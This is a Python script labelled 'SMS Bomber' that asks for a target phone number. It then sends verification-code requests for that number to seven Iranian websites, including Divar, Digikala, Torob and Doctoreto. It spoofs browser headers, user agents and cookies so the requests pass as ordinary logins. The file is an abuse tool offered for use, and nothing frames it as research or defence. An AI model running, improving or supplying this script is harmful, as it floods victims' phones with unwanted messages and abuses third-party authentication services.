from requests import post,get
from user_agent import generate_user_agent
from colorama import Fore
from os import system , name

g = Fore.GREEN
w = Fore.WHITE
b = Fore.LIGHTBLACK_EX
r = Fore.RED
re = Fore.RESET

def divar(number):
    site = "https://api.divar.ir/v5/auth/authenticate"
    header = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Length": "23",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "api.divar.ir",
        "Origin": "https://divar.ir",
        "Referer": "https://divar.ir/",
        "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Sec-GPC": "1",
        "User-Agent": generate_user_agent(os="linux"),
        "X-Standard-Divar-Error": "true"
    }
    data = {"phone":f"0+{number}"}
    divarr = post(url=site, json=data, headers=header)
    if divarr.status_code == 200:
        print(f'{g}({divarr.status_code}){w} Divar Sended !')
    else:
        print(f'{r}({divarr.status_code}){w} Divar Not Sended !')


def torob(number):
    site = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}"
    torobr = get(url=site)
    if torobr.status_code == 200:
        print(f'{g}({torobr.status_code}){w} Torob Send !')
    else:
        print(f'{r}({torobr.status_code}){w} Torob Not Send !')

def ghabzino(number):
    site = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    data = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": f'0{number}'}}
    header = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://ghabzino.com','referer': 'https://ghabzino.com/','user-agent': generate_user_agent(os="linux")}
    ghabzinor = post(url=site, json=data, headers=header)
    if ghabzinor.status_code == 200:
        print(f'{g}({ghabzinor.status_code}){w} Ghabzino Send !')
    else:
        print(f'{r}({ghabzinor.status_code}){w} Ghabzino Not Send !')

def digikala(number):
    site = 'https://api.digikala.com/v1/user/authenticate/'
    data = {"username": f'0{number}'}
    header = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Access-Control-Request-Headers": "content-type,x-web-client,x-web-optimize-response",
        "Access-Control-Request-Method": "POST",
        "Connection": "keep-alive",
        "Host": "api.digikala.com",
        "Origin": "https://www.digikala.com",
        "Referer": "https://www.digikala.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": generate_user_agent(os="mac")
    }
    digikalar = post(url=site, json=data, headers=header)
    if digikalar.status_code == 200:
        print(f'{g}({digikalar.status_code}){w} digikala Send !')
    else:
        print(f'{r}({digikalar.status_code}){w} digikala Not Send !')

def hamrah(number):
    site = 'https://www.hamrah-mechanic.com/api/v1/membership/otp'
    data = {
  "PhoneNumber": f"{number}",
  "prevDomainUrl": "https://www.google.com/",
  "landingPageUrl": "https://www.hamrah-mechanic.com/",
  "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
  "prevUrl": "https://www.hamrah-mechanic.com/profile/",
  "referrer": "https://www.google.com/"
}
    header = headers = {
    "_uti": "3b534c14-3afd-4907-9cfe-258fc84978eb",
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Length": "272",
    "Content-Type": "application/json",
    "Cookie": "show-login=showed; EndPage=1; _uti=3b534c14-3afd-4907-9cfe-258fc84978eb; analytics_campaign={%22source%22:%22bing%22%2C%22medium%22:%22organic%22}; analytics_token=f63d7938-b6d3-1d0b-5ba2-490f07963a54; analytics_session_token=20c6c793-c10d-0917-d523-6f19dc4768b1; yektanet_session_last_activity=11/23/2024; _yngt_iframe=1; _gcl_au=1.1.730629661.1732378841; _yngt=01JDCX6KM6DV2XBWEP7ZJE4SRA; _ga=GA1.2.2036949947.1732378842; _gid=GA1.2.90801843.1732378842; _gat_UA-106934660-1=1; _hjSessionU...",
    "env": "prd",
    "fcm": "",
    "gps_ad_id": "",
    "Host": "www.hamrah-mechanic.com",
    "install_source": "",
    "Origin": "https://www.hamrah-mechanic.com",
    "Referer": "https://www.hamrah-mechanic.com/membersignin/",
    "sec-ch-ua": "\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Source": "web",
    "User-Agent": generate_user_agent(os="linux")
}
    hamrahr = post(url=site, json=data, headers=header)
    if hamrahr.status_code == 200:
        print(f'{g}({hamrahr.status_code}){w} HamrahMec Send !')
    else:
        print(f'{r}({hamrahr.status_code}){w} HamrahMec Not Send !')

def docterto(number):
    site = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
    data = {
  "mobile": f"{number}",
  "country_id": 205,
  "captcha": ""
}
    header = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "app-version": "2.0.0",
        "Connection": "keep-alive",
        "Content-Length": "53",
        "Content-Type": "application/json",
        "Cookie": "UG=nsECNSsSWE81; SUG=cIn9JugaP45; _gcl_au=1.1.253851887.1732379376; _gid=GA1.2.810861762.1732379379; _gat_UA-81198296-1=1; _clck=ha9b9p%7C2%7Cfr4%7C0%7C1788; _ga=GA1.2.1300353040.1732379378; _clsk=j3jl3t%7C1732379393879%7C3%7C0%7Cw.clarity.ms%2Fcollect; _ga_YYV44WWYMV=GS1.1.1732379378.1.1.1732379394.44.0.0",
        "Host": "api.doctoreto.com",
        "Origin": "https://doctoreto.com",
        "Referer": "https://doctoreto.com/",
        "sec-ch-ua": "\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": generate_user_agent(os="mac")
    }
    doctertor = post(url=site, json=data, headers=header)
    if doctertor.status_code == 200:
        print(f'{g}({doctertor.status_code}){w} Doctertor Send !')
    else:
        print(f'{r}({doctertor.status_code}){w} Doctertor Not Send !')


def drdr(number):
    site = 'https://drdr.ir/api/v3/auth/login/mobile/init/'
    data = {
  "mobile": f"0{number}"
}
    header = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-store, max-age=0",
        "client-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054",
        "Connection": "keep-alive",
        "Content-Length": "24",
        "Content-Type": "application/json",
        "Cookie": "__arcsco=4887d93dc580cc213845a6ad2330f9d2; _gcl_au=1.1.1208329043.1732379822; _ga=GA1.1.1447537251.1732379824; _ga_VPMXG7C0RF=GS1.1.1732379823.1.1.1732379870.0.0.0",
        "Host": "drdr.ir",
        "Origin": "https://drdr.ir",
        "Referer": "https://drdr.ir/",
        "sec-ch-ua": "\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": generate_user_agent(os="mac")
    }
    drdrr = post(url=site, json=data, headers=header)
    if drdrr.status_code == 200:
        print(f'{g}({drdrr.status_code}){w} Drdr Send !')
    else:
        print(f'{r}({drdrr.status_code}){w} Drdr Not Send !')




system('cls' if name == 'nt' else 'clear')
bn = f"""
{Fore.RED}
┏┓   ┏┓  ┳┓     ┓   
┗┓┏┳┓┗┓  ┣┫┏┓┏┳┓┣┓┏┓
┗┛┛┗┗┗┛  ┻┛┗┛┛┗┗┗┛┛ 
   By AqaHirad{Fore.WHITE}                 
   
"""

print(bn)

phone = int(input(f'Phone Target {Fore.RED}> {Fore.WHITE}'))
system('cls' if name == 'nt' else 'clear')
print(bn)


digikala(phone)
ghabzino(phone)
divar(phone)
torob(phone)
hamrah(phone)
drdr(phone)
docterto(phone)
